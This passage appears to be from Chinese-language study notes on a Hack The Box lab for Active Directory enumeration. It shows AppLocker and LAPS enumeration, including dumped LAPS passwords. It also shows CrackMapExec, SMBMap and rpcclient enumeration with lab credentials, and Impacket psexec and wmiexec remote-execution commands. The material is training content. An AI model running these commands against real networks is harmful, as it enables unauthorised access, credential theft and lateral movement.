class="built_in">group</span> to run all applications.</span><br><span class="line">UserOrGroupSid      : S<span class="literal">-1-5-32-544</span></span><br><span class="line">Action              : Allow</span><br></pre></td></tr></table></figure>

<h3 id="解析-Get-AppLockerPolicy-Effective-结果"><a href="#解析-Get-AppLockerPolicy-Effective-结果" class="headerlink" title="解析 Get-AppLockerPolicy -Effective 结果"></a><strong>解析 <code>Get-AppLockerPolicy -Effective</code> 结果</strong></h3><p>你的命令 <code>Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</code> <strong>用于查看当前 Windows 设备上生效的 AppLocker 策略</strong>。AppLocker 是 Windows 用于控制应用程序执行的安全策略，常用于限制<strong>恶意软件执行</strong>或<strong>防止用户运行未经授权的软件</strong>。</p>
<p><strong>解析 AppLocker 规则</strong></p>
<p>你的输出显示了几条重要的规则：</p>
<table>
<thead>
<tr>
<th>规则名称</th>
<th>受影响路径</th>
<th>影响的用户&#x2F;组</th>
<th>操作</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Block PowerShell</strong></td>
<td><code>%SYSTEM32%\WINDOWSPOWERSHELL\V1.0\POWERSHELL.EXE</code></td>
<td><code>S-1-5-21-2974783224-3764228556-2640795941-513</code> (Domain Users)</td>
<td><strong>Deny（阻止）</strong></td>
</tr>
<tr>
<td><strong>(Default Rule) All files located in Program Files</strong></td>
<td><code>%PROGRAMFILES%\*</code></td>
<td><code>S-1-1-0</code> (Everyone)</td>
<td><strong>Allow（允许）</strong></td>
</tr>
<tr>
<td><strong>(Default Rule) All files located in Windows folder</strong></td>
<td><code>%WINDIR%\*</code></td>
<td><code>S-1-1-0</code> (Everyone)</td>
<td><strong>Allow（允许）</strong></td>
</tr>
<tr>
<td><strong>(Default Rule) All files</strong></td>
<td><code>*</code></td>
<td><code>S-1-5-32-544</code> (Administrators)</td>
<td><strong>Allow（允许）</strong></td>
</tr>
</tbody></table>
<h2 id="3-枚举语言模式"><a href="#3-枚举语言模式" class="headerlink" title="3. 枚举语言模式"></a>3. 枚举语言模式</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="variable">$ExecutionContext</span>.SessionState.LanguageMode</span><br><span class="line"></span><br><span class="line">ConstrainedLanguage</span><br></pre></td></tr></table></figure>

<h2 id="4-枚举LAPS"><a href="#4-枚举LAPS" class="headerlink" title="4. 枚举LAPS"></a>4. 枚举LAPS</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Find-LAPSDelegatedGroups</span></span><br><span class="line"></span><br><span class="line">OrgUnit                                             Delegated Groups</span><br><span class="line"><span class="literal">-------</span>                                             <span class="literal">----------------</span></span><br><span class="line">OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\Domain Admins</span><br><span class="line">OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\LAPS Admins</span><br><span class="line">OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL           INLANEFREIGHT\Domain Admins</span><br><span class="line">OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL           INLANEFREIGHT\LAPS Admins</span><br><span class="line">OU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Domain Admins</span><br><span class="line">OU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\LAPS Admins</span><br><span class="line">OU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Domain Admins</span><br><span class="line">OU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\LAPS Admins</span><br><span class="line">OU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\Domain Admins</span><br><span class="line">OU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\LAPS Admins</span><br><span class="line">OU=Contractor Laptops,OU=Workstations,DC=INLANEF... INLANEFREIGHT\Domain Admins</span><br><span class="line">OU=Contractor Laptops,OU=Workstations,DC=INLANEF... INLANEFREIGHT\LAPS Admins</span><br><span class="line">OU=Staff Workstations,OU=Workstations,DC=INLANEF... INLANEFREIGHT\Domain Admins</span><br><span class="line">OU=Staff Workstations,OU=Workstations,DC=INLANEF... INLANEFREIGHT\LAPS Admins</span><br><span class="line">OU=Executive Workstations,OU=Workstations,DC=INL... INLANEFREIGHT\Domain Admins</span><br><span class="line">OU=Executive Workstations,OU=Workstations,DC=INL... INLANEFREIGHT\LAPS Admins</span><br><span class="line">OU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\Domain Admins</span><br><span class="line">OU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\LAPS Admins</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Find-AdmPwdExtendedRights</span></span><br><span class="line"></span><br><span class="line">ComputerName                Identity                    Reason</span><br><span class="line"><span class="literal">------------</span>                <span class="literal">--------</span>                    <span class="literal">------</span></span><br><span class="line">EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\Domain Admins Delegated</span><br><span class="line">EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\LAPS Admins   Delegated</span><br><span class="line">SQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\Domain Admins Delegated</span><br><span class="line">SQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\LAPS Admins   Delegated</span><br><span class="line">WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\Domain Admins Delegated</span><br><span class="line">WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\LAPS Admins   Delegated</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-LAPSComputers</span></span><br><span class="line"></span><br><span class="line">ComputerName                Password       Expiration</span><br><span class="line"><span class="literal">------------</span>                <span class="literal">--------</span>       <span class="literal">----------</span></span><br><span class="line">DC01.INLANEFREIGHT.LOCAL    <span class="number">6</span>DZ[+<span class="type">A</span>/[]<span class="number">19</span><span class="type">d</span><span class="variable">$F</span> <span class="number">08</span>/<span class="number">26</span>/<span class="number">2020</span> <span class="number">23</span>:<span class="number">29</span>:<span class="number">45</span></span><br><span class="line"><span class="type">EXCHG01.INLANEFREIGHT.LOCAL</span> <span class="type">oj</span>+<span class="number">2</span><span class="type">A</span>+[<span class="type">hHMMtj</span>, <span class="number">09</span>/<span class="number">26</span>/<span class="number">2020</span> <span class="number">00</span>:<span class="number">51</span>:<span class="number">30</span></span><br><span class="line"><span class="type">SQL01.INLANEFREIGHT.LOCAL</span>   <span class="number">9</span><span class="type">G</span><span class="comment">#f;p41dcAe,s 09/26/2020 00:30:09</span></span><br><span class="line"><span class="type">WS01.INLANEFREIGHT.LOCAL</span>    <span class="type">TCaG</span>-<span class="type">F</span>)<span class="number">3</span><span class="type">No</span>;<span class="type">l8C</span> <span class="number">09</span>/<span class="number">26</span>/<span class="number">2020</span> <span class="number">00</span>:<span class="number">46</span>:<span class="number">04</span></span><br></pre></td></tr></table></figure>

<h1 id="获取一个域用户凭据后的枚举"><a href="#获取一个域用户凭据后的枚举" class="headerlink" title="获取一个域用户凭据后的枚举"></a>获取一个域用户凭据后的枚举</h1><h2 id="1-CME-域用户-组-已登录用户-share枚举"><a href="#1-CME-域用户-组-已登录用户-share枚举" class="headerlink" title="1. CME - 域用户&#x2F;组&#x2F;已登录用户&#x2F;share枚举"></a>1. CME - 域用户&#x2F;组&#x2F;已登录用户&#x2F;share枚举</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --<span class="built_in">users</span></span><br><span class="line"></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 </span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-03-29 12:29:14.476567</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2022-04-09 23:04:58.611828</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-03-30 16:27:41.960920</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez                       badpwdcount: 3 baddpwdtime: 2022-02-24 18:10:01.903395</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --<span class="built_in">groups</span></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 </span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain group(s)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Administrators                           membercount: 3</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Users                                    membercount: 4</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Guests                                   membercount: 2</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Print Operators                          membercount: 0</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Backup Operators                         membercount: 1</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Replicator                               membercount: 0</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Admins                            membercount: 19</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Users                             membercount: 0</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Contractors                              membercount: 138</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Accounting                               membercount: 15</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Engineering                              membercount: 19</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Executives                               membercount: 10</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Human Resources                          membercount: 36</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.130    445    ACADEMY-EA-FILE  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-FILE) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 (Pwn3d!)</span><br><span class="line">SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] Enumerated loggedon <span class="built_in">users</span></span><br><span class="line">SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\clusteragent              logon_server: ACADEMY-EA-DC01</span><br><span class="line">SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\lab_adm                   logon_server: ACADEMY-EA-DC01</span><br><span class="line">SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\svc_qualys                logon_server: ACADEMY-EA-DC01</span><br><span class="line">SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\wley                      logon_server: ACADEMY-EA-DC01</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 </span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated shares</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Share           Permissions     Remark</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  -----           -----------     ------</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  ADMIN$                          Remote Admin</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  C$                              Default share</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Department Shares READ            </span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  IPC$            READ            Remote IPC</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  NETLOGON        READ            Logon server share </span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  SYSVOL          READ            Logon server share </span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  User Shares     READ            </span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  ZZZ_archive     READ </span><br></pre></td></tr></table></figure>

<p><strong>Spider Share</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share <span class="string">&#x27;Department Shares&#x27;</span></span><br><span class="line"></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 </span><br><span class="line">SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Started spidering plus with option:</span><br><span class="line">SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        DIR: [<span class="string">&#x27;print$&#x27;</span>]</span><br><span class="line">SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        EXT: [<span class="string">&#x27;ico&#x27;</span>, <span class="string">&#x27;lnk&#x27;</span>]</span><br><span class="line">SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]       SIZE: 51200</span><br><span class="line">SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]     OUTPUT: /tmp/cme_spider_plus</span><br></pre></td></tr></table></figure>

<h2 id="2-SMBMap-访问权限检查-递归目录"><a href="#2-SMBMap-访问权限检查-递归目录" class="headerlink" title="2. SMBMap - 访问权限检查&#x2F;递归目录"></a>2. SMBMap - 访问权限检查&#x2F;递归目录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5</span><br><span class="line"></span><br><span class="line">[+] IP: 172.16.5.5:445	Name: inlanefreight.local                               </span><br><span class="line">        Disk                                                  	Permissions	Comment</span><br><span class="line">	----                                                  	-----------	-------</span><br><span class="line">	ADMIN$                                            	NO ACCESS	Remote Admin</span><br><span class="line">	C$                                                	NO ACCESS	Default share</span><br><span class="line">	Department Shares                                 	READ ONLY	</span><br><span class="line">	IPC$                                              	READ ONLY	Remote IPC</span><br><span class="line">	NETLOGON                                          	READ ONLY	Logon server share </span><br><span class="line">	SYSVOL                                            	READ ONLY	Logon server share </span><br><span class="line">	User Shares                                       	READ ONLY	</span><br><span class="line">	ZZZ_archive                                       	READ ONLY</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R <span class="string">&#x27;Department Shares&#x27;</span> --dir-only</span><br><span class="line"></span><br><span class="line">[+] IP: 172.16.5.5:445	Name: inlanefreight.local                               </span><br><span class="line">        Disk                                                  	Permissions	Comment</span><br><span class="line">	----                                                  	-----------	-------</span><br><span class="line">	Department Shares                                 	READ ONLY	</span><br><span class="line">	.\Department Shares\*</span><br><span class="line">	dr--r--r--                0 Thu Mar 31 15:34:29 2022	.</span><br><span class="line">	dr--r--r--                0 Thu Mar 31 15:34:29 2022	..</span><br><span class="line">	dr--r--r--                0 Thu Mar 31 15:14:48 2022	Accounting</span><br><span class="line">	dr--r--r--                0 Thu Mar 31 15:14:39 2022	Executives</span><br><span class="line">	dr--r--r--                0 Thu Mar 31 15:14:57 2022	Finance</span><br><span class="line">	dr--r--r--                0 Thu Mar 31 15:15:04 2022	HR</span><br><span class="line">	dr--r--r--                0 Thu Mar 31 15:15:21 2022	IT</span><br><span class="line">	dr--r--r--                0 Thu Mar 31 15:15:29 2022	Legal</span><br><span class="line">	dr--r--r--                0 Thu Mar 31 15:15:37 2022	Marketing</span><br><span class="line">	dr--r--r--                0 Thu Mar 31 15:15:47 2022	Operations</span><br><span class="line">	dr--r--r--                0 Thu Mar 31 15:15:58 2022	R&amp;D</span><br><span class="line">	dr--r--r--                0 Thu Mar 31 15:16:10 2022	Temp</span><br><span class="line">	dr--r--r--                0 Thu Mar 31 15:16:18 2022	Warehouse</span><br><span class="line"></span><br><span class="line">    &lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h2 id="3-rpcclient-枚举"><a href="#3-rpcclient-枚举" class="headerlink" title="3. rpcclient 枚举"></a>3. rpcclient 枚举</h2><p>在查看 rpcclient 中的用户时，您可能会注意到每个用户旁边都有一个名为 <code>rid:</code> 的字段。相对标识符（RID）是 Windows 用于跟踪和标识对象的唯一标识符（以十六进制格式表示）。为了解释这一点，让我们看看下面的示例：</p>
<ul>
<li>INLANEFREIGHT.LOCAL 域的 SID 是： <code>S-1-5-21-3842939050-3880317879-2865463114</code> 。</li>
<li>当在域内创建对象时，上述编号（SID）将与 RID 结合，生成一个用于表示该对象的唯一值。</li>
<li>因此，域用户 <code>htb-student</code> 具有 RID:[0x457] 十六进制 0x457 将等于十进制 <code>1111</code> ，其完整用户 SID 为： <code>S-1-5-21-3842939050-3880317879-2865463114-1111</code> 。</li>
<li>这是 INLANEFREIGHT.LOCAL 域中 <code>htb-student</code> 对象独有的，您永远不会看到此配对值与该域或其他任何域中的另一个对象相关联。</li>
</ul>
<p>然而，你会发现有些账户无论在哪台主机上，其 RID 都是相同的。例如，域的内置管理员账户的 RID 为[administrator] rid:[0x1f4]，转换为十进制值后等于 <code>500</code> 。内置管理员账户的 RID 值始终为 <code>Hex 0x1f4</code> ，即 500。这一情况始终不变。由于此值对对象是唯一的，我们可以利用它从域中枚举更多关于该对象的信息。让我们再次尝试使用 rpcclient 进行操作，这次我们将针对 <code>htb-student</code> 用户进行一些挖掘。</p>
<h3 id="通过-RID-进行-RPCClient-用户枚举"><a href="#通过-RID-进行-RPCClient-用户枚举" class="headerlink" title="通过 RID 进行 RPCClient 用户枚举"></a>通过 RID 进行 RPCClient 用户枚举</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">rpcclient $&gt; queryuser 0x457</span><br><span class="line"></span><br><span class="line">        User Name   :   htb-student</span><br><span class="line">        Full Name   :   Htb Student</span><br><span class="line">        Home Drive  :</span><br><span class="line">        Dir Drive   :</span><br><span class="line">        Profile Path:</span><br><span class="line">        Logon Script:</span><br><span class="line">        Description :</span><br><span class="line">        Workstations:</span><br><span class="line">        Comment     :</span><br><span class="line">        Remote Dial :</span><br><span class="line">        Logon Time               :      Wed, 02 Mar 2022 15:34:32 EST</span><br><span class="line">        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST</span><br><span class="line">        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT</span><br><span class="line">        Password last <span class="built_in">set</span> Time   :      Wed, 27 Oct 2021 12:26:52 EDT</span><br><span class="line">        Password can change Time :      Thu, 28 Oct 2021 12:26:52 EDT</span><br><span class="line">        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT</span><br><span class="line">        unknown_2[0..31]...</span><br><span class="line">        user_rid :      0x457</span><br><span class="line">        group_rid:      0x201</span><br><span class="line">        acb_info :      0x00000010</span><br><span class="line">        fields_present: 0x00ffffff</span><br><span class="line">        logon_divs:     168</span><br><span class="line">        bad_password_count:     0x00000000</span><br><span class="line">        logon_count:    0x0000001d</span><br><span class="line">        padding1[0..7]...</span><br><span class="line">        logon_hrs[0..21]...</span><br></pre></td></tr></table></figure>

<h3 id="Enumdomusers-枚举域用户"><a href="#Enumdomusers-枚举域用户" class="headerlink" title="Enumdomusers 枚举域用户"></a>Enumdomusers 枚举域用户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">rpcclient $&gt; enumdomusers</span><br><span class="line"></span><br><span class="line">user:[administrator] rid:[0x1f4]</span><br><span class="line">user:[guest] rid:[0x1f5]</span><br><span class="line">user:[krbtgt] rid:[0x1f6]</span><br><span class="line">user:[lab_adm] rid:[0x3e9]</span><br><span class="line">user:[htb-student] rid:[0x457]</span><br><span class="line">user:[avazquez] rid:[0x458]</span><br><span class="line">user:[pfalcon] rid:[0x459]</span><br><span class="line">user:[fanthony] rid:[0x45a]</span><br><span class="line">user:[wdillard] rid:[0x45b]</span><br><span class="line">user:[lbradford] rid:[0x45c]</span><br><span class="line">user:[sgage] rid:[0x45d]</span><br><span class="line">user:[asanchez] rid:[0x45e]</span><br><span class="line">user:[dbranch] rid:[0x45f]</span><br><span class="line">user:[ccruz] rid:[0x460]</span><br><span class="line">user:[njohnson] rid:[0x461]</span><br><span class="line">user:[mholliday] rid:[0x462]</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;  </span><br></pre></td></tr></table></figure>

<h2 id="4-Impacket-工具包"><a href="#4-Impacket-工具包" class="headerlink" title="4. Impacket 工具包"></a>4. Impacket 工具包</h2><h3 id="使用-psexec-py"><a href="#使用-psexec-py" class="headerlink" title="使用 psexec.py"></a>使用 psexec.py</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.py inlanefreight.local/wley:<span class="string">&#x27;transporter@4&#x27;</span>@172.16.5.125  </span><br></pre></td></tr></table></figure>

<h3 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a>wmiexec.py</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py inlanefreight.local/wley:<span class="string">&#x27;transporter@4&#x27;</span>@172.16.5.5 </span><br></pre></td></tr></table></figure>

